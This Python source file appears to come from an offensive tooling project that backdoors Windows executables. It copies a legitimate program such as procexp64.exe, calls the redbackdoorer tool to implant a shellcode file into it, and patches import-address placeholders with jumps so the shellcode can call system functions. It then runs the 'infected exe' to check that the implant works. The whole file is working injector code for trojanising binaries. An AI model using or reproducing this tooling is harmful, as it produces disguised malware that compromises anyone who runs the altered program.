from helper import *
import shutil
import pprint
from pehelper import *
from model import *


def inject_exe(shc_file, exe_in, exe_out, mode, exe_capabilities: ExeCapabilities):
    print("--[ Injecting: {} into: {} -> {} ]".format(
        shc_file, exe_in, exe_out
    ))

    # create copy of file exe_in to exe_out
    shutil.copyfile(exe_in, exe_out)

    # inject shellcode into exe_out with redbackdoorer
    # python3.exe .\redbackdoorer.py 1,1 main-clean-append.bin .\exes\procexp64-a.exe
    subprocess.run([
        "python3.exe",
        "redbackdoorer.py",
        mode,
        shc_file,
        exe_out
    ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # get code section of exe_out
    code = get_code_section(exe_out)

    # replace IAT in shellcode in code
    # and re-implant it
    for cap in exe_capabilities.get_all().values():
        if not cap.id in code:
            print("Not found, abort")
            raise Exception()
        
        off = code.index(cap.id)
        current_address = off + exe_capabilities.image_base + exe_capabilities.text_virtaddr
        destination_address = cap.addr
        print("    Replace at 0x{:x} with call to 0x{:x}".format(
            current_address, destination_address
        ))
        jmp = assemble_and_disassemble_jump(
            current_address, destination_address
        )
        code = code.replace(cap.id, jmp)
        write_code_section(exe_out, code)

        #print(" Off: 0x{:X}".format(off))
        #print(" Off2: 0x{:X}".format(current_address)) # base addr
        #print(" Diff: 0x{:X}".format())
        #print("ONE: {}".format(jmp))
        #print("TWO: {}".format(cap.id))
        #print("Found! replacing")

        


def verify_injected_exe(exefile):
    print("---[ Verify infected exe: {} ]".format(exefile))
    # remove indicator file
    pathlib.Path(verify_filename).unlink(missing_ok=True)

    subprocess.run([
        exefile,
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)  # , check=True
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(verify_filename):
        print("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(verify_filename)
        return True
    else:
        print("---> Verify FAIL. Infected exe does not work (no file created)")
        return False

